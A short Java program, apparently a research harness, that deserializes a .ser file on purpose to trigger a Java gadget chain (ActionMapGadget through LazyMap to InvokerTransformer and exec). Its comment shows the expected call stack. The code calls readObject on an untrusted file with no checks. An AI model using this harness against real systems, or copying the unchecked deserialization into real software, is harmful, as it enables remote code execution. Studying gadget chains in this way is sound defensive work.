/** Read a .ser and deserialize it (triggers gadget if payload is live).

 * With asm_actionmap.ser from ActionMapAsmPayloadGen, stderr will show:
 *   ========== gadget call stack (before exec) ==========
 *   java.lang.Throwable: ActionMapGadget → TiedMapEntry → LazyMap → …
 *       at sast.gadget.StackProbe.printChain(...)
 *       at ... InvokerTransformer.transform ...
 *       at ... LazyMap.get ...
 *       at ... TiedMapEntry.equals/getValue ...
 *       at ... ActionMapGadget.readObject ...
 *       at ... ObjectInputStream.readObject ...
 *       at Deserialize.main ...
 */
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class Deserialize {
    public static void main(String[] args) throws Exception {
        String path = args.length > 0 ? args[0] : "asm_actionmap.ser";
        System.out.println("[*] reading " + path);
        System.out.println("[*] if payload includes StackProbe, call stack prints on stderr before exec");
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path))) {
            Object o = ois.readObject();
            System.out.println("[*] ok, got " + o.getClass().getName());
        }
    }
}
